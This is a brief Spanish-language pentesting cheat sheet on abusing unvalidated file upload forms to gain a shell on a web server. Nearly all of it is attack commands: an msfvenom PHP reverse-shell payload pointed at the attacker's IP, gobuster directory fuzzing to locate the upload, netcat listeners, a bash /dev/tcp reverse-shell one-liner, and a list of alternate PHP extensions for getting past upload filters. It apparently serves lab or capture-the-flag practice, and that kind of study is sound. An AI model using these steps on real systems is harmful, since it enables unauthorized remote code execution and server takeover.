# File Upload: Subida de Archivos Maliciosos

Si un servidor web permite subir archivos sin validación, podemos subir un payload para ejecutar comandos.

## Subir Payload PHP

```bash
msfvenom -p php/reverse_php LHOST=<IP_atacante> LPORT=<puerto> -f raw > pwned.php
```

## Localizar el Archivo Subido

Usar fuzzing para encontrar la ruta donde se almacena el archivo:

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

## Recibir la Conexion

```bash
nc -nlvp <puerto>
```

Al ejecutar el archivo desde el navegador, recibimos la shell.

## Enviar una Reverse Shell Mejorada

Una vez dentro, enviamos una segunda reverse shell mas estable:

```bash
nc -nlvp <puerto2>
```

```bash
bash -c "sh -i >& /dev/tcp/<IP_atacante>/<puerto2> 0>&1"
```

## Bypass de Restricciones de Extension

Si el servidor rechaza `.php`, probar extensiones alternativas que el servidor tambien ejecuta como PHP:

```
.phtml, .php3, .php4, .php5, .php6, .php7, .phar
```

```bash
mv pwned.php pwned.phtml
```
